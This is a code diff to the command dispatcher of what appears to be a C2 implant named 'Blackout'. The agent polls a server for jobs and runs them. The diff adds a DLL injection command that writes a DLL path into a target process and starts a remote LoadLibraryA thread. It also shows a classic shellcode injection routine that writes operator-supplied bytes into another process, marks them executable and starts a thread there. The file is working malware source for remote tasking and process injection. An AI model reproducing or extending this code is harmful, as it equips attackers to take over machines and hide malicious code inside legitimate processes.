@@ -6,16 +6,17 @@ FUNC VOID CommandDispatcher(
 ) {
     BLACKOUT_INSTANCE
 
-    Instance()->Commands[ 0 ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
-    Instance()->Commands[ 1 ] = { .ID = COMMAND_MEMORY,   .Function = CommandMemory };
-    Instance()->Commands[ 2 ] = { .ID = COMMAND_RUN,      .Function = CommandRun };
-    Instance()->Commands[ 3 ] = { .ID = COMMAND_EXPLORER, .Function = CommandExplorer };
-    Instance()->Commands[ 4 ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
-    Instance()->Commands[ 5 ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
-    Instance()->Commands[ 6 ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
-    Instance()->Commands[ 7 ] = { .ID = COMMAND_CLASSIC,  .Function = CommandClassicInjection };
-    Instance()->Commands[ 8 ] = { .ID = COMMAND_PROCLIST, .Function = CommandProcEnum };
-    Instance()->Commands[ 9 ] = { .ID = CMD_COFFLOADER,   .Function = CmdCoffLoader };
+    Instance()->Commands[ 0  ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
+    Instance()->Commands[ 1  ] = { .ID = COMMAND_MEMORY,   .Function = CommandMemory };
+    Instance()->Commands[ 2  ] = { .ID = COMMAND_RUN,      .Function = CmdRun };
+    Instance()->Commands[ 3  ] = { .ID = COMMAND_EXPLORER, .Function = CmdExplorer };
+    Instance()->Commands[ 4  ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
+    Instance()->Commands[ 5  ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
+    Instance()->Commands[ 6  ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
+    Instance()->Commands[ 7  ] = { .ID = COMMAND_CLASSIC,  .Function = CommandInjectionClassic };
+    Instance()->Commands[ 8  ] = { .ID = COMMAND_PROCLIST, .Function = CommandProcEnum };
+    Instance()->Commands[ 9  ] = { .ID = CMD_COFFLOADER,   .Function = CmdCoffLoader };
+    Instance()->Commands[ 10 ] = { .ID = CMD_DLLINJECTION, .Function = CmdDllInjection }; 
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -31,16 +32,14 @@ FUNC VOID CommandDispatcher(
             return;
 
         SleepMain( Instance()->Session.SleepTime * 1000 );
-
         Package = PackageCreate( COMMAND_GET_JOB );
-
         PackageAddInt32( Package, Instance()->Session.AgentId );
         PackageTransmit( Package, &DataBuffer, &DataSize );
 
         if ( DataBuffer && DataSize > 0 ) {
             ParserNew( &Parser, DataBuffer, DataSize );
             do
-            {
+            {   
                 TaskCommand = ParserGetInt32( &Parser );
 
                 if ( TaskCommand != COMMAND_NO_JOB )
@@ -66,8 +65,7 @@ FUNC VOID CommandDispatcher(
 
             } while ( Parser.Length > 4 );
 
-            MmSet( DataBuffer, 0, DataSize );
-            Instance()->Win32.LocalFree( *( PVOID* ) DataBuffer );
+            //bkHeapFree( DataBuffer, DataSize );
             DataBuffer = NULL;
 
             ParserDestroy( &Parser );
@@ -83,45 +81,47 @@ FUNC VOID CommandDispatcher(
     Instance()->Session.Connected = FALSE;
 }
 
-FUNC VOID CommandClassicInjection(
+FUNC VOID CommandInjectionClassic(
     PPARSER Parser
 ) {
     BK_PACKAGE = PackageCreate( COMMAND_CLASSIC );
 
-    MEMORY_RANGE_ENTRY MemRange = { 0 };
-    DWORD  Err = 0;
+    DWORD  bkErrorCode = 0;
     HANDLE ProcessHandle  = NULL;
     DWORD  ProcessId      = ParserGetInt32( Parser );
+        BK_PRINT( "1 %d\n", ProcessId );
+
     DWORD  RegionSize     = 0;
     PVOID  MemAllocated   = NULL;
     PBYTE  ShellcodeBytes = ParserGetBytes( Parser, &RegionSize );
     DWORD  ThreadId       = 0;
     HANDLE ThreadHandle   = NULL;
 
-    Err = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
-    if ( Err != 0 ) 
+    bkErrorCode = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
+    if ( bkErrorCode != 0 ) 
        goto _Leave;
 
-    Err = bkMemAlloc( ProcessHandle, &MemAllocated, RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-    if ( Err != 0 ) 
+    bkErrorCode = bkMemAlloc( ProcessHandle, &MemAllocated, RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    if ( bkErrorCode != 0 ) 
        goto _Leave;
 
-    Err = bkMemWrite( ProcessHandle, MemAllocated, ShellcodeBytes, RegionSize );
-    if ( Err != 0 ) 
+    bkErrorCode = bkMemWrite( ProcessHandle, MemAllocated, ShellcodeBytes, RegionSize );
+    if ( bkErrorCode != 0 ) 
        goto _Leave;
 
-    Err = bkMemProtect( ProcessHandle, MemAllocated, RegionSize, PAGE_EXECUTE_READ );
-    if ( Err != 0 )
+    bkErrorCode = bkMemProtect( ProcessHandle, MemAllocated, RegionSize, PAGE_EXECUTE_READ );
+    if ( bkErrorCode != 0 )
        goto _Leave;
 
-
-    Err = bkThreadCreate( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
-    if ( Err != 0 )
+    bkErrorCode = bkThreadCreate( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
+    if ( bkErrorCode != 0 )
        goto _Leave;
 
 _Leave:
-    if ( Err != 0 ) {
-        PackageTransmitError( Err ); return;
+    if ( ThreadHandle  ) bkHandleClose( ThreadHandle  );
+    if ( ProcessHandle ) bkHandleClose( ProcessHandle );
+    if ( bkErrorCode != 0 ) {
+        PackageTransmitError( bkErrorCode ); return;
     }
 
     PackageAddInt32( BK_PACKAGE, ProcessId );
@@ -136,7 +136,7 @@ FUNC VOID CommandMemory(
 ) {    
     M_MEM MemOp = ParserGetInt32( Parser );
     BK_PACKAGE  = PackageCreate( COMMAND_MEMORY );
-    DWORD Err   = 0;
+    DWORD bkErrorCode   = 0;
 
     switch ( MemOp ) {
         case ALLOC: {
@@ -145,9 +145,9 @@ FUNC VOID CommandMemory(
             UINT64 RegionSize    = ParserGetInt64( Parser );
             DWORD  Protection    = ParserGetInt32( Parser );
 
-            Err = bkMemAlloc( ProcessHandle, &BaseAddr, RegionSize, 0x3000, Protection );
-            if (Err != 0) {
-                PackageTransmitError(Err);
+            bkErrorCode = bkMemAlloc( ProcessHandle, &BaseAddr, RegionSize, 0x3000, Protection );
+            if (bkErrorCode != 0) {
+                PackageTransmitError(bkErrorCode);
                 return;
             }
 
@@ -161,9 +161,9 @@ FUNC VOID CommandMemory(
             UINT32 BufferSize    = 0;
             PBYTE  Buffer        = ParserGetBytes( Parser, &BufferSize );
 
-            Err = bkMemWrite( ProcessHandle, MemBaseAddr, Buffer, BufferSize );
-            if (Err != 0) {
-                PackageTransmitError( Err );
+            bkErrorCode = bkMemWrite( ProcessHandle, MemBaseAddr, Buffer, BufferSize );
+            if (bkErrorCode != 0) {
+                PackageTransmitError( bkErrorCode );
                 return;
             }
 
@@ -176,7 +176,7 @@ FUNC VOID CommandMemory(
     }
 }
 
-FUNC VOID CommandRun(
+FUNC VOID CmdRun(
     _In_ PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
@@ -199,7 +199,7 @@ FUNC VOID CommandRun(
     PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
 
-FUNC VOID CommandExplorer(
+FUNC VOID CmdExplorer(
     _In_ PPARSER Parser
 ) {
     BLACKOUT_INSTANCE
@@ -236,6 +236,41 @@ FUNC VOID CommandExplorer(
     }
 }
 
+FUNC VOID CmdDllInjection(
+    PPARSER Parser
+) {
+    BLACKOUT_INSTANCE
+    
+    UINT32 ProcessId = ParserGetInt32( Parser );
+    PSTR   DllPath   = ParserGetString( Parser, 0 );
+    
+    HANDLE ProcessHandle = NULL;
+    HANDLE ThreadHandle  = NULL;
+    UINT32 bkErrorCode   = 0;
+    PVOID  MemoryAlloc   = NULL;
+
+    BK_PRINT( "proc id %d dllpath %s\n", ProcessId, DllPath );
+
+    if ( ProcessId != 0 ) {
+        bkErrorCode = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
+        if ( bkErrorCode != 0 ) goto _Leave;
+    }
+
+    bkErrorCode = bkMemAlloc( ProcessHandle, &MemoryAlloc, StringLengthA( DllPath ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    if ( bkErrorCode != 0 ) goto _Leave;
+
+    bkErrorCode = bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
+    if ( bkErrorCode != 0 ) goto _Leave;
+
+    bkErrorCode = bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
+    if ( bkErrorCode != 0 ) goto _Leave;
+
+_Leave:
+    if ( ProcessHandle ) bkHandleClose( ProcessHandle );
+
+    BK_PRINT( "%d %x\n", bkErrorCode, bkErrorCode );
+}
+
 FUNC VOID CmdCoffLoader(
     PPARSER Parser
 ) {
@@ -257,7 +292,7 @@ FUNC VOID CommandProcEnum(
 
     BK_PACKAGE = PackageCreate( COMMAND_PROCLIST );
 
-    DWORD  Err         = 0;
+    DWORD  bkErrorCode         = 0;
     DWORD  ReturnLen1  = 0;
     PVOID  ValToFree   = NULL;
     PSTR   UserBuff    = 0;
@@ -275,9 +310,9 @@ FUNC VOID CommandProcEnum(
 
     ValToFree = Spi;
 
-    Err = Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, Spi, ReturnLen1, &ReturnLen1 );
-    if ( Err != STATUS_SUCCESS ) {
-        PackageTransmitError( Err );
+    bkErrorCode = Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, Spi, ReturnLen1, &ReturnLen1 );
+    if ( bkErrorCode != STATUS_SUCCESS ) {
+        PackageTransmitError( bkErrorCode );
         return;
     }
 
@@ -293,7 +328,7 @@ FUNC VOID CommandProcEnum(
 
         GetTokenUserA( TokenHandle, &UserBuff, &UserBuffLen );
 
-        Err = Instance()->Win32.NtQueryInformationProcess( 
+        bkErrorCode = Instance()->Win32.NtQueryInformationProcess( 
             UlongToHandle( Spi->UniqueProcessId ), ProcessBasicInformation,
             &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ), NULL 
         ); 
